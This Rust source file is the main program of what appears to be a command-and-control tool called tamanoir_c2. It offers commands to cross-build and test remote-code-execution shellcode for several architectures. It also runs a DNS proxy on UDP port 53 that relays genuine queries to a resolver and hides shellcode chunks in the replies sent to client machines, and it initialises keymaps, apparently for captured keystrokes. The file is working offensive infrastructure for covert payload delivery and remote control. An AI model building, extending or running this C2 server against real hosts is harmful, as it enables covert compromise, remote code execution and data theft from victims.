use std::{collections::HashMap, net::Ipv4Addr, sync::Arc};

use clap::{Parser, Subcommand};
use log::{debug, error, info};
use tamanoir_c2::{
    builder::build,
    handlers::{add_info, forward_req, init_keymaps, mangle, max_payload_length},
    select_payload,
    tester::test_bin,
    Engine, Session, TargetArch,
};
use tamanoir_common::ContinuationByte;
use tokio::{net::UdpSocket, sync::Mutex};

#[derive(Debug, Parser)]
struct Opt {
    #[clap(subcommand)]
    command: Command,
}
#[derive(Debug, Subcommand)]
enum Command {
    #[clap(subcommand)]
    #[command(about = "Build/test Remote Control Execution shell codes")]
    Rce(RceCommand),
    #[command(about = "Start the dns proxy / c2 server")]
    Start {
        #[clap(short, long, default_value = "53")]
        port: u16,
        #[clap(long, default_value = "8.8.8.8")]
        dns_ip: Ipv4Addr,
        #[clap(long, default_value = "8")]
        payload_len: usize,
        #[clap(long, default_value = "hello")]
        rce: String,
        #[clap(long, default_value = "x86_64")]
        target_arch: TargetArch,
    },
}

#[derive(Debug, Subcommand)]
enum RceCommand {
    #[command(about = "Build shell code payload for specified architecture")]
    Build {
        #[clap(short,long, default_value = "x86_64",help=format!("Target architecture (supported are {:#?} )",TargetArch::ALL.into_iter().map(|t|t.to_string()).collect::<Vec<_>>()))]
        target_arch: TargetArch,
        #[clap(
            short,
            long,
            default_value = "docker",
            help = "cross build engine (docker and podman supported)"
        )]
        engine: Engine,
        #[clap(
            short,
            long,
            default_value = "",
            help = "key=value, space-separated env vars required for your shellcode, if needed"
        )]
        build_vars: String,
        #[clap(short, long)]
        crate_path: String,
        #[clap(short, long)]
        out_dir: String,
    },
    #[command(about = "Build shell code payload for all available aritectures")]
    BuildAll {
        #[clap(short, long, default_value = "docker")]
        engine: Engine,
        #[clap(short, long, default_value = "")]
        build_vars: String,
        #[clap(short, long)]
        crate_path: String,
        #[clap(short, long)]
        out_dir: String,
    },
    #[command(about = "Test a shellcode against current architecture")]
    Test {
        #[clap(short, long)]
        bin_path: String,
    },
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let Opt { command } = Opt::parse();
    env_logger::Builder::from_env(env_logger::Env::default().default_filter_or("info")).init();

    match command {
        Command::Rce(rce_cmd) => match rce_cmd {
            RceCommand::Build {
                target_arch,
                engine,
                crate_path,
                build_vars,
                out_dir,
            } => {
                if let Err(e) = build(crate_path, engine, target_arch, build_vars, out_dir) {
                    error!("{}", e);
                    std::process::exit(1);
                }
            }
            RceCommand::Test { bin_path } => {
                if let Err(e) = test_bin(bin_path) {
                    error!("{}", e);
                    std::process::exit(1);
                }
            }
            RceCommand::BuildAll {
                engine,
                crate_path,
                build_vars,
                out_dir,
            } => {
                for arch in TargetArch::ALL {
                    if let Err(e) = build(
                        crate_path.clone(),
                        engine.clone(),
                        arch,
                        build_vars.clone(),
                        out_dir.clone(),
                    ) {
                        error!("{}", e);
                        std::process::exit(1);
                    }
                }
            }
        },
        Command::Start {
            port,
            dns_ip,
            payload_len,
            rce,
            target_arch,
        } => {
            init_keymaps();
            let sock = UdpSocket::bind(format!("0.0.0.0:{}", port)).await?;
            info!("Listening on {}", format!("0.0.0.0:{}", port));
            let sessions: Arc<Mutex<HashMap<Ipv4Addr, Session>>> =
                Arc::new(Mutex::new(HashMap::new()));

            let selected_payload = select_payload(rce, target_arch).unwrap();
            let mut remaining_payload = selected_payload.clone();
            let mut is_start = true;
            loop {
                let mut buf = [0u8; 512];
                let (len, addr) = sock.recv_from(&mut buf).await?;
                debug!("{:?} bytes received from {:?}", len, addr);
                let data = mangle(&buf[..len], addr, payload_len, sessions.clone())
                    .await
                    .unwrap();
                if let Ok(mut data) = forward_req(data, dns_ip).await {
                    let payload_max_len = max_payload_length(data.len());
                    debug!(
                        "init len={} max payload len={}",
                        data.len(),
                        payload_max_len
                    );
                    if remaining_payload.len() > 0 {
                        let payload: Vec<u8> = remaining_payload
                            .drain(0..payload_max_len.min(remaining_payload.len()))
                            .collect();
                        debug!("PAYLOAD SZ={}", payload.len());
                        let cbyte = if payload.len() == selected_payload.len() {
                            ContinuationByte::ResetEnd
                        } else if remaining_payload.len() == 0 {
                            ContinuationByte::End
                        } else if is_start {
                            ContinuationByte::Reset
                        } else {
                            ContinuationByte::Continue
                        };
                        if let Ok(augmented_data) = add_info(&mut data, &payload, cbyte).await {
                            let len = sock.send_to(&augmented_data, addr).await?;
                            debug!("{:?} bytes sent", len);
                        }
                    } else {
                        debug!("no more payload to send");
                        let len = sock.send_to(&data, addr).await?;
                        debug!("{:?} bytes sent", len);
                    }
                }
                is_start = false;
            }
        }
    }
    Ok(())
}
